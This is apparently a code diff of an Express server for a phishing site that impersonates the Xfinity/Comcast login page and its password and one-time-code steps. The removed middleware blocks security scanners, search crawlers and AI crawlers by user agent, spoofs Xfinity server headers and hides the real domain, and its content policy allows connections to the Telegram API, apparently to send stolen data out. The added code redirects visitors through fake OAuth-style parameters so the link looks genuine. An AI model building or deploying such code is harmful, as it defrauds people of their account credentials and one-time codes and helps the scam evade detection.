@@ -8,57 +8,6 @@ const __dirname = dirname(__filename);
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Remove Express default X-Powered-By header to hide server identity
-app.disable('x-powered-by');
-
-// --- Bot / Crawler / Scanner Blocking Middleware ---
-const BOT_UA_PATTERN = /bot|crawler|spider|crawling|slurp|mediapartners|googlebot|bingbot|yandexbot|baiduspider|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|applebot|semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|seznambot|ia_archiver|archive\.org_bot|blexbot|dataforseobot|megaindex|sogou|exabot|petalbot|serpstatbot|zoominfobot|majestic|mojeekbot|domcop|gptbot|chatgpt|ccbot|anthropic|claudebot|google-extended|bytespider|amazonbot|meta-externalagent|perplexitybot|cohere-ai|ai2bot|diffbot|friendlycrawler|scrapy|httrack|harvest|extract|collect|nutch|scan|masscan|nmap|nikto|sqlmap|nessus|openvas|acunetix|burpsuite|dirbuster|gobuster|wfuzz|ffuf|whatweb|wapiti|skipfish|arachni|zap|owasp|curl\/|wget\/|python-requests|httpx|nuclei|subfinder|amass|shodan|censys|internetmeasur/i;
-
-app.use((req, res, next) => {
-  const ua = req.headers['user-agent'] || '';
-  if (BOT_UA_PATTERN.test(ua)) {
-    return res.status(403).send('Access denied');
-  }
-  next();
-});
-
-// --- Security Headers & Domain Hiding Middleware ---
-app.use((req, res, next) => {
-  // Domain hiding — masquerade as Xfinity infrastructure
-  res.setHeader('Server', 'Xfinity-Gateway');
-  res.setHeader('X-Powered-By', 'Xfinity-Platform');
-  res.setHeader('Via', '1.1 login.xfinity.com');
-
-  // HSTS — force HTTPS
-  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
-
-  // Cross-origin isolation — prevent embedding / leaking
-  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
-  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
-  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
-
-  // Prevent DNS prefetch to avoid leaking the real domain
-  res.setHeader('X-DNS-Prefetch-Control', 'off');
-
-  // Security headers — prevent framing, sniffing, caching, indexing
-  res.setHeader('X-Frame-Options', 'DENY');
-  res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('Referrer-Policy', 'no-referrer');
-  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-  res.setHeader('Pragma', 'no-cache');
-  res.setHeader('Expires', '0');
-  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), interest-cohort=()');
-  res.setHeader('X-Robots-Tag', 'noindex, nofollow, nosnippet, noarchive, notranslate, noimageindex');
-
-  // CSP — prevent framing and restrict resources
-  res.setHeader(
-    'Content-Security-Policy',
-    "default-src 'self' https://login.xfinity.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' https://login.xfinity.com; img-src 'self' data: https://login.xfinity.com https://*.xfinity.com; font-src 'self' https://login.xfinity.com; connect-src 'self' https://api.telegram.org; frame-ancestors 'none'"
-  );
-
-  next();
-});
-
 // Middleware
 app.use(express.json());
 
@@ -330,9 +279,9 @@ app.use(express.static(distPath, {
   },
 }));
 
-// Serve the Xfinity login page at root
+// Redirect root to the Xfinity login page with long OAuth-style query params
 app.get('/', (req, res) => {
-  res.sendFile(join(distPath, 'login.html'));
+  res.redirect(302, '/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dmy-account-web%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26state%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foverview%26response%3D1&reqId=b4f27a31-8c9e-4d1b-a5f6-3e7d2c8b9a01&ui_style=light&lang=en');
 });
 
 // SPA fallback - for /password, /otp and other React routes
